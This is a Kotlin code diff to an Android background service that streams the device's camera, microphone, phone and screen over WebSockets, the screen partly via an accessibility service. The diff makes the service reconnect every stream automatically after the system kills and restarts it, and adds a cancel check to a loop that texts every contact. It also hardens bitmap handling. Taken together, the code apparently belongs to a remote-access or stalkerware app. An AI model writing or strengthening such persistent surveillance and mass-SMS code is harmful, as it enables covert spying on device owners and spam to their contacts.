@@ -186,6 +186,22 @@ class StreamingService : Service() {
             }
             "SWITCH_CAM" -> switchCamera(intent.getStringExtra("cam") ?: "back")
             ACTION_STOP  -> { disconnect(); stopSelf() }
+            else -> {
+                // null intent = Android restarted service after process kill (START_STICKY)
+                if (wsBack == null) connectCamWs()
+                else if (cameraProvider == null &&
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                        == PackageManager.PERMISSION_GRANTED) bindCamera()
+                if (wsAudio == null) connectAudioWs()
+                if (wsPhone == null) connectPhoneWs()
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    if (wsScreen == null && ControlService.instance != null) {
+                        @Suppress("NewApi") connectScreenWsAccessibility()
+                    }
+                } else if (wsScreen == null && mediaProjection != null) {
+                    connectScreenWs()
+                }
+            }
         }
         return START_STICKY
     }
@@ -805,6 +821,7 @@ class StreamingService : Service() {
                 getSystemService(SmsManager::class.java) else SmsManager.getDefault()
             var sent = 0; var failed = 0
             for ((name, number) in contacts) {
+                if (!isRunning) { done(false, "Отменено", sent, failed); return@Thread }
                 var ok = false
                 var errMsg = ""
                 try {
@@ -1489,12 +1506,17 @@ class StreamingService : Service() {
             if (now - lastArr[0] < 33 || ws.queueSize() > 512 * 1024) return
             lastArr[0] = now
             val bitmap = proxy.toBitmap()
-            val m = Matrix().apply { postRotate(proxy.imageInfo.rotationDegrees.toFloat()) }
-            val rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, m, true)
-            bitmap.recycle()
+            val rotated = try {
+                val m = Matrix().apply { postRotate(proxy.imageInfo.rotationDegrees.toFloat()) }
+                Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, m, true)
+                    .also { bitmap.recycle() }
+            } catch (e: Exception) { bitmap.recycle(); throw e }
             val scale = minOf(1f, 720f / maxOf(rotated.width, rotated.height))
             val final = if (scale < 1f)
-                Bitmap.createScaledBitmap(rotated, (rotated.width * scale).toInt(), (rotated.height * scale).toInt(), true).also { rotated.recycle() }
+                try {
+                    Bitmap.createScaledBitmap(rotated, (rotated.width * scale).toInt(), (rotated.height * scale).toInt(), true)
+                        .also { rotated.recycle() }
+                } catch (e: Exception) { rotated.recycle(); throw e }
             else rotated
             try {
                 val out = ByteArrayOutputStream()
